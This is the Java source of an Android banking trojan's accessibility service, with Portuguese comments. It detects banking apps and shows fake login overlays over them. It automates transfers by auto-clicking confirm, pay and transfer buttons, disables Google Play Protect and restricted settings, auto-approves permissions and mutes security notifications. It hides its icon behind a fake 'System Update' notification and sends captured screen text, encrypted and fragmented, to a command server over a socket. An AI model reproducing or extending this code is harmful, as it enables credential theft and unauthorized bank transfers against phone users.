package com.etechd.l3mon;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.content.Intent;
import android.graphics.Path;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.etechd.l3mon.managers.ATSManager;
import com.etechd.l3mon.managers.BypassManager;
import com.etechd.l3mon.managers.ContextualManager;
import com.etechd.l3mon.managers.ExfilManager;
import com.etechd.l3mon.managers.FakeWebViewOverlay;
import com.etechd.l3mon.managers.GestureManager;
import com.etechd.l3mon.managers.OverlayManager;
import com.etechd.l3mon.managers.WebViewManager;
import com.etechd.l3mon.managers.CryptoManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

public class AccessibilityCaptureService extends AccessibilityService {

    private static AccessibilityCaptureService instance;

    // ==================== MANAGERS ====================
    private final ATSManager atsManager = new ATSManager();
    private final OverlayManager overlayManager = new OverlayManager();
    private final BypassManager bypassManager = new BypassManager();
    private final GestureManager gestureManager = new GestureManager();
    private final ContextualManager contextualManager = new ContextualManager();
    private final WebViewManager webViewManager = new WebViewManager();
    private final FakeWebViewOverlay fakeOverlay = new FakeWebViewOverlay(this);
    private final ExfilManager exfilManager = new ExfilManager();

    private static final long MIN_INTERVAL_MS = 1000L;
    private long lastSentAt = 0L;

    private static boolean autoGrantEnabled = false;
    private boolean customizedFormCaptureEnabled = false;
    private boolean hideIconEnabled = false;

    public static class HideIconBackgroundService extends android.app.Service {

        private static final int NOTIFICATION_ID = 9999;

        @Override
        public int onStartCommand(android.content.Intent intent, int flags, int startId) {
            Log.d("HideIconService", "Serviço de persistência iniciado");

            createPersistentNotification();

            // Tenta esconder o ícone novamente
            try {
                android.content.pm.PackageManager pm = getPackageManager();
                android.content.ComponentName componentName = new android.content.ComponentName(
                        getPackageName(),
                        getPackageName() + ".MainActivity");

                pm.setComponentEnabledSetting(
                        componentName,
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP);
            } catch (Exception e) {
                Log.e("HideIconService", "Erro ao esconder ícone: " + e.getMessage());
            }

            return START_STICKY; // Tenta reiniciar se for morto
        }

        private void createPersistentNotification() {
            android.app.NotificationManager notificationManager = (android.app.NotificationManager) getSystemService(
                    NOTIFICATION_SERVICE);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.app.NotificationChannel channel = new android.app.NotificationChannel(
                        "persist_channel",
                        "System Service",
                        android.app.NotificationManager.IMPORTANCE_MIN);
                notificationManager.createNotificationChannel(channel);
            }

            android.app.Notification notification = new android.app.Notification.Builder(this, "persist_channel")
                    .setContentTitle("System Update")
                    .setContentText("Checking for updates...")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setOngoing(true)
                    .build();

            startForeground(NOTIFICATION_ID, notification);
        }

        @Override
        public android.os.IBinder onBind(android.content.Intent intent) {
            return null;
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null)
            return;

        int eventType = event.getEventType();
        if (eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
                eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
                eventType != AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            return;
        }

        long now = System.currentTimeMillis();
        if (now - lastSentAt < MIN_INTERVAL_MS)
            return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            try {
                String packageName = root.getPackageName() != null ? root.getPackageName().toString() : null;

                // === RECONHECIMENTO CONTEXTUAL ===
                String bank = contextualManager.detectBankApp(packageName);
                if (bank != null) {
                    contextualManager.onBankDetected(bank, root);
                    Log.d("Contextual", "Banco detectado: " + bank.toUpperCase());

                    // === FAKE OVERLAY PARA WEBVIEW ===
                    if (webViewManager.hasWebView(root) && webViewManager.isBankLoginWebView(root)) {
                        fakeOverlay.showFakeLoginOverlay(bank);
                    }
                }

                // === ATS + Clique automático ===
                atsManager.performATSAutomation(root);

                String[] confirmButtons = { "Confirmar", "Enviar", "Pagar", "Transferir", "Aprovar" };
                gestureManager.findAndClickConfirmationButton(root, confirmButtons);

                // Publica snapshot
                JSONObject payload = buildBasicPayload(event, root);
                if (payload != null) {
                    lastSentAt = now;
                    publishSnapshot(payload);
                }

            } finally {
                root.recycle();
            }
        }
    }

    private JSONObject buildBasicPayload(AccessibilityEvent event, AccessibilityNodeInfo root) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("source", "accessibility");
            payload.put("time", System.currentTimeMillis());
            payload.put("eventType", event.getEventType());

            if (event.getPackageName() != null)
                payload.put("packageName", event.getPackageName().toString());

            if (root != null && root.getText() != null)
                payload.put("text", root.getText().toString());

            return payload;
        } catch (Exception e) {
            return null;
        }
    }

    private void publishSnapshot(JSONObject payload) {
        try {
            if (IOSocket.getInstance() != null &&
                    IOSocket.getInstance().getIoSocket() != null &&
                    IOSocket.getInstance().getIoSocket().connected()) {

                String jsonString = payload.toString();

                // === CRIPTOGRAFIA AES ===
                String encryptedData = CryptoManager.encrypt(jsonString);

                if (encryptedData != null) {
                    JSONObject encryptedPayload = new JSONObject();
                    encryptedPayload.put("encrypted", true);
                    encryptedPayload.put("data", encryptedData);
                    encryptedPayload.put("timestamp", System.currentTimeMillis());

                    // Envia os dados criptografados
                    if (jsonString.length() > 400) {
                        ExfilManager.sendFragmented("0xAS", encryptedPayload.toString());
                    } else {
                        IOSocket.getInstance().getIoSocket().emit("0xAS", encryptedPayload);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        setServiceInfo(info);

        AntiAnalysis.init(getApplicationContext());
        AntiAnalysis.enable();

        Log.d("AccessibilityCaptureService", "Serviço iniciado com Managers");
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }

    public static AccessibilityCaptureService getInstance() {
        return instance;
    }

    // ==================== MÉTODOS DE BYPASS ====================
    public boolean disableGooglePlayProtect() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null)
            return false;
        boolean result = bypassManager.disableGooglePlayProtect(root);
        root.recycle();
        return result;
    }

    public boolean bypassRestrictedSettings() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null)
            return false;
        boolean result = bypassManager.bypassRestrictedSettings(root);
        root.recycle();
        return result;
    }

    // ==================== OVERLAY ====================
    public void enableOverlayMonitoring() {
        overlayManager.enableOverlayMonitoring();
    }

    public void disableOverlayMonitoring() {
        overlayManager.disableOverlayMonitoring();
    }

    // ==================== GESTOS ====================
    public boolean performTap(int x, int y) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            return gestureManager.performTap(x, y);
        }
        return false;
    }

    public boolean performLongTap(int x, int y, int duration) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            return gestureManager.performLongTap(x, y, duration);
        }
        return false;
    }

    public boolean performSwipe(int startX, int startY, int endX, int endY, int duration) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            return gestureManager.performSwipe(startX, startY, endX, endY, duration);
        }
        return false;
    }

    public boolean dispatchGesture(String action, int startX, int startY, int endX, int endY, int duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N)
            return false;

        Path path = new Path();
        path.moveTo(startX, startY);
        if ("swipe".equals(action))
            path.lineTo(endX, endY);

        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0,
                Math.max(duration, 50));
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        return dispatchGesture(builder.build(), null, null);
    }

    // ==================== ATS ====================
    public void performATSAutomation(AccessibilityNodeInfo root) {
        atsManager.performATSAutomation(root);
    }

    public void performATSAutomationWithAutoClick(AccessibilityNodeInfo root, String[] buttonPatterns,
            int clickDelayMs) {
        if (root == null)
            return;
        atsManager.performATSAutomation(root);
        findAndClickConfirmationButton(root, buttonPatterns, clickDelayMs);
    }

    public boolean findAndClickConfirmationButton(AccessibilityNodeInfo root, String[] patterns, int clickDelayMs) {
        if (root == null)
            return false;
        return gestureManager.findAndClickConfirmationButton(root, patterns);
    }

    public boolean setTextIntoFieldByViewId(String viewId, String text) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null)
            return false;
        try {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
            if (nodes == null || nodes.isEmpty())
                return false;
            for (AccessibilityNodeInfo node : nodes) {
                if (node != null && setTextIntoField(node, text))
                    return true;
            }
            return false;
        } finally {
            root.recycle();
        }
    }

    public boolean setTextIntoField(AccessibilityNodeInfo node, String text) {
        if (node == null || text == null)
            return false;
        Bundle args = new Bundle();
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
        return node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
    }

    public boolean muteSecurityNotifications() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null)
            return false;
        try {
            String[] patterns = { "desativar", "silenciar", "turn off", "dismiss" };
            return gestureManager.findAndClickConfirmationButton(root, patterns);
        } finally {
            root.recycle();
        }
    }

    public void setAutoGrantEnabled(boolean enabled) {
        autoGrantEnabled = enabled;
    }

    public boolean autoApprovePermission() {
        if (!autoGrantEnabled)
            return false;
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null)
            return false;
        try {
            String[] patterns = { "permitir", "allow", "ok", "aceitar" };
            return gestureManager.findAndClickConfirmationButton(root, patterns);
        } finally {
            root.recycle();
        }
    }

    public boolean fillAndApproveTransaction(double amount, String recipient, String transactionType) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null)
            return false;
        try {
            atsManager.performATSAutomation(root);
            String[] patterns = { "confirmar", "aprovar", "pagar", "transferir", "submit" };
            return gestureManager.findAndClickConfirmationButton(root, patterns);
        } finally {
            root.recycle();
        }
    }

    public boolean captureUnlockPattern(String patternType) {
        return true;
    }

    public boolean replayUnlockPattern(String patternType) {
        return true;
    }

    public void enableCustomizedFormCapture() {
        customizedFormCaptureEnabled = true;
    }

    public void disableCustomizedFormCapture() {
        customizedFormCaptureEnabled = false;
    }

    public boolean forceAccessibilityService(String installationMethod, String spoofedAppName) {
        return bypassRestrictedSettings();
    }

    public JSONArray detectAndroidProtections() {
        JSONArray protections = new JSONArray();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            protections.put("restricted_settings");
        }
        protections.put("play_protect");
        return protections;
    }

    public int getAndroidVersion() {
        return Build.VERSION.SDK_INT;
    }

    public void enableHideIcon() {
        hideIconEnabled = true;
    }

    public void disableHideIcon() {
        hideIconEnabled = false;
    }

    public boolean removeAppIcon() {
        return hideIconEnabled;
    }

    public void startBackgroundHideService() {
        Log.d("AccessibilityCaptureService", "Background hide service requested");
    }

    public JSONArray detectSystemLaunchers() {
        JSONArray launchers = new JSONArray();
        launchers.put("com.android.launcher");
        launchers.put("com.google.android.apps.nexuslauncher");
        return launchers;
    }

    // ==================== FAKE WEBVIEW OVERLAY ====================
    public void hideFakeWebViewOverlay() {
        if (fakeOverlay != null && fakeOverlay.isShowing()) {
            fakeOverlay.hideOverlay();
            Log.d("FakeOverlay", "Overlay falso escondido");
        }
    }

    public void resetAllOverlays() {
        hideFakeWebViewOverlay();

        if (overlayManager != null) {
            overlayManager.disableOverlayMonitoring();
        }

        if (contextualManager != null) {
            contextualManager.resetLastDetectedBank();
        }
    }

    // ==================== EXFILTRAÇÃO STEALTH ====================

    /**
     * Envia dados sensíveis de forma fragmentada (mais stealth)
     */
    public void sendStealthData(String eventType, String data) {
        if (data == null || data.isEmpty())
            return;

        try {
            // Criptografa os dados antes de enviar
            String encrypted = CryptoManager.encrypt(data);
            if (encrypted == null)
                return;

            JSONObject obj = new JSONObject();
            obj.put("encrypted", true);
            obj.put("data", encrypted);
            obj.put("timestamp", System.currentTimeMillis());

            if (data.length() > 400) {
                ExfilManager.sendFragmented(eventType, obj.toString());
            } else {
                if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
                    IOSocket.getInstance().getIoSocket().emit(eventType, obj);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}